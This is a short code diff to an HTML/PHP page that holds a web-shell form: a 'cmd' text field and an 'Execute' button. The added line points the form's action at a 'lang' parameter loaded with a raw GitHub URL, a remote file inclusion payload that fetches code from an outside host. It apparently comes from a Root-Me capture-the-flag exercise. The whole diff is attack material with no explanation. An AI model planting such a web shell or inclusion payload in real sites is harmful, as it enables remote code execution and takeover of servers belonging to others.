@@ -1,6 +1,6 @@
 <html>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<form method="GET" action="?lang=https://raw.githubusercontent.com/kallly/ROOTME/main/file1" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" id="cmd" size="80">
 <input type="SUBMIT" value="Execute">
 </form>
